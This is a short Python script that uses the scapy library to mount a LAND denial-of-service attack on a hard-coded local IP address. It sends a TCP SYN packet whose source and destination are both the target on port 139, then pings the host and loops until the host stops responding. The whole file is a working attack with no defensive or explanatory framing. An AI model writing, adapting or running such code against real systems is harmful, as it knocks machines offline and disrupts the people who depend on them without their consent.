import scapy.all as scapy

"""
 Requires being run as ROOT/administrator.
"""
TARGET = "192.168.1.241"


def craft():
    return scapy.IP(src=TARGET, dst=TARGET)/scapy.TCP(sport=139, dport=139, flags="S")

def ping(destination):
    packet = scapy.IP(dst=destination, ttl=20)/scapy.ICMP()
    result = scapy.sr1(packet, timeout=5)
    if result is None:
        return False
    else:
        return True


up = ping(TARGET)
print("Pinged target")
if up:  # If it's up
    # Craft packet.
    payload = craft()
    # Send payload.
    down = False
    while not down:  # Should hopefully only run once.
        print("Target is up. Sending payload.")
        scapy.send(payload)
        print("Pinging target...")
        up = ping(TARGET)
        if not up:
            print("Target not responding. Assuming its down.")
            down = True
else:
    print("Host is already down. Check the IP?")

print("Finished.")
